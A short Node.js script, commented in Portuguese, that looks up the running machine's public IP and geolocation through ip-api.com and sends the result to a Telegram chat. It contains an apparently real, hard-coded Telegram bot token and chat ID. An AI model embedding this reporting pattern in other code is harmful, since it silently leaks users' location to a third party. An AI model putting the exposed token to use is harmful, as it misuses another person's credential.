const request = require('request');

// Função para realizar a solicitação à API IP-API
function getIPDetails(callback) {
  const url = 'http://ip-api.com/json'; //http://ip-api.com/json

  request(url, { json: true }, (error, response, body) => {
    if (error) {
      console.log('Erro ao obter os detalhes do IP:', error);
      callback(null);
    } else {
      callback(body);
    }
  });
}

// Função para enviar as informações para o bot no Telegram
function sendTelegramMessage(message, token, chatId) {
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const formData = {
    chat_id: chatId,
    text: message
  };

  request.post({ url, form: formData }, (error, response, body) => {
    if (error) {
      console.log('Erro ao enviar a mensagem para o Telegram:', error);
    } else {
      console.log('Mensagem enviada para o Telegram com sucesso!');
    }
  });
}

// Executa a função para obter os detalhes do IP
getIPDetails((ipDetails) => {
  if (ipDetails) {
    // Converte os detalhes do IP para uma string formatada
    const message = JSON.stringify(ipDetails, null, 2);

    // Insira aqui o seu token do bot do Telegram
    const token = '6070765539:AAF4MvOmCigHqy-kCq7m5jdxTA0ydtl9dHY';

    // Insira aqui o chat ID onde deseja enviar a mensagem
    const chatId = '-968435308';

    // Envia a mensagem para o Telegram
    sendTelegramMessage(message, token, chatId);
  }
});